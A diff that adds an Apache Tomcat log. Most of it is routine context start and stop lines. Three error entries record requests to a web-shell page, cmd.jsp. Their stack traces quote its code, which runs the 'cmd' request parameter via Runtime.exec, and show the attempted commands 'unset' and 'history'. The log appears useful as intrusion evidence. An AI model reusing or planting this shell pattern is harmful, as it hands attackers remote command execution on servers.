@@ -1,0 +1,180 @@
+15-May-2023 04:51:59.022 INFO [main] org.apache.catalina.core.ApplicationContext.log ContextListener: contextInitialized()
+15-May-2023 04:51:59.023 INFO [main] org.apache.catalina.core.ApplicationContext.log SessionListener: contextInitialized()
+15-May-2023 04:51:59.025 INFO [main] org.apache.catalina.core.ApplicationContext.log ContextListener: attributeAdded('StockTicker', 'async.Stockticker@6ff29830')
+15-May-2023 05:17:17.285 INFO [main] org.apache.catalina.core.ApplicationContext.log ContextListener: contextInitialized()
+15-May-2023 05:17:17.286 INFO [main] org.apache.catalina.core.ApplicationContext.log SessionListener: contextInitialized()
+15-May-2023 05:17:17.291 INFO [main] org.apache.catalina.core.ApplicationContext.log ContextListener: attributeAdded('StockTicker', 'async.Stockticker@7a675056')
+15-May-2023 05:17:17.464 INFO [main] org.apache.catalina.core.ApplicationContext.log SessionListener: contextDestroyed()
+15-May-2023 05:17:17.464 INFO [main] org.apache.catalina.core.ApplicationContext.log ContextListener: contextDestroyed()
+15-May-2023 05:27:19.557 INFO [main] org.apache.catalina.core.ApplicationContext.log ContextListener: contextInitialized()
+15-May-2023 05:27:19.558 INFO [main] org.apache.catalina.core.ApplicationContext.log SessionListener: contextInitialized()
+15-May-2023 05:27:19.559 INFO [main] org.apache.catalina.core.ApplicationContext.log ContextListener: attributeAdded('StockTicker', 'async.Stockticker@623a8092')
+15-May-2023 05:27:19.727 INFO [main] org.apache.catalina.core.ApplicationContext.log SessionListener: contextDestroyed()
+15-May-2023 05:27:19.739 INFO [main] org.apache.catalina.core.ApplicationContext.log ContextListener: contextDestroyed()
+15-May-2023 08:19:46.365 SEVERE [http-nio-8080-exec-17] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [jsp] in context with path [/jsp_app] threw exception
+	java.io.IOException: An exception occurred processing [/cmd.jsp] at line [21]
+
+18: <%
+19: if (request.getParameter("cmd") != null) {
+20:         out.println("Command: " + request.getParameter("cmd") + "<BR>");
+21:         Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+22:         OutputStream os = p.getOutputStream();
+23:         InputStream in = p.getInputStream();
+24:         DataInputStream dis = new DataInputStream(in);
+
+
+Stacktrace:
+		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:494)
+		at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:379)
+		at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:327)
+		at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)
+		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:209)
+		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
+		at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
+		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:178)
+		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
+		at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167)
+		at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)
+		at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:481)
+		at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130)
+		at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
+		at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:673)
+		at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+		at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:390)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:750)
+	Caused by: java.io.IOException: Cannot run program "unset": error=2, No such file or directory
+		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048)
+		at java.lang.Runtime.exec(Runtime.java:593)
+		at java.lang.Runtime.exec(Runtime.java:423)
+		at java.lang.Runtime.exec(Runtime.java:320)
+		at org.apache.jsp.cmd_jsp._jspService(cmd_jsp.java:141)
+		at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
+		at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)
+		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:466)
+		... 25 more
+	Caused by: java.io.IOException: error=2, No such file or directory
+		at java.lang.UNIXProcess.forkAndExec(Native Method)
+		at java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
+		at java.lang.ProcessImpl.start(ProcessImpl.java:134)
+		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
+		... 32 more
+15-May-2023 08:19:47.167 SEVERE [http-nio-8080-exec-19] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [jsp] in context with path [/jsp_app] threw exception
+	java.io.IOException: An exception occurred processing [/cmd.jsp] at line [21]
+
+18: <%
+19: if (request.getParameter("cmd") != null) {
+20:         out.println("Command: " + request.getParameter("cmd") + "<BR>");
+21:         Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+22:         OutputStream os = p.getOutputStream();
+23:         InputStream in = p.getInputStream();
+24:         DataInputStream dis = new DataInputStream(in);
+
+
+Stacktrace:
+		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:494)
+		at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:379)
+		at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:327)
+		at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)
+		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:209)
+		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
+		at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
+		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:178)
+		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
+		at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167)
+		at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)
+		at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:481)
+		at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130)
+		at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
+		at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:673)
+		at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+		at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:390)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:750)
+	Caused by: java.io.IOException: Cannot run program "unset": error=2, No such file or directory
+		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048)
+		at java.lang.Runtime.exec(Runtime.java:593)
+		at java.lang.Runtime.exec(Runtime.java:423)
+		at java.lang.Runtime.exec(Runtime.java:320)
+		at org.apache.jsp.cmd_jsp._jspService(cmd_jsp.java:141)
+		at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
+		at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)
+		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:466)
+		... 25 more
+	Caused by: java.io.IOException: error=2, No such file or directory
+		at java.lang.UNIXProcess.forkAndExec(Native Method)
+		at java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
+		at java.lang.ProcessImpl.start(ProcessImpl.java:134)
+		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
+		... 32 more
+15-May-2023 08:20:21.136 SEVERE [http-nio-8080-exec-20] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [jsp] in context with path [/jsp_app] threw exception
+	java.io.IOException: An exception occurred processing [/cmd.jsp] at line [21]
+
+18: <%
+19: if (request.getParameter("cmd") != null) {
+20:         out.println("Command: " + request.getParameter("cmd") + "<BR>");
+21:         Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+22:         OutputStream os = p.getOutputStream();
+23:         InputStream in = p.getInputStream();
+24:         DataInputStream dis = new DataInputStream(in);
+
+
+Stacktrace:
+		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:494)
+		at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:379)
+		at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:327)
+		at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)
+		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:209)
+		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
+		at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
+		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:178)
+		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
+		at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167)
+		at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)
+		at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:481)
+		at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130)
+		at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
+		at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:673)
+		at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+		at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:390)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:750)
+	Caused by: java.io.IOException: Cannot run program "history": error=2, No such file or directory
+		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048)
+		at java.lang.Runtime.exec(Runtime.java:593)
+		at java.lang.Runtime.exec(Runtime.java:423)
+		at java.lang.Runtime.exec(Runtime.java:320)
+		at org.apache.jsp.cmd_jsp._jspService(cmd_jsp.java:141)
+		at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
+		at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)
+		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:466)
+		... 25 more
+	Caused by: java.io.IOException: error=2, No such file or directory
+		at java.lang.UNIXProcess.forkAndExec(Native Method)
+		at java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
+		at java.lang.ProcessImpl.start(ProcessImpl.java:134)
+		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
+		... 32 more
+15-May-2023 12:01:11.253 INFO [Thread-2] org.apache.catalina.core.ApplicationContext.log SessionListener: contextDestroyed()
+15-May-2023 12:01:11.284 INFO [Thread-2] org.apache.catalina.core.ApplicationContext.log ContextListener: contextDestroyed()
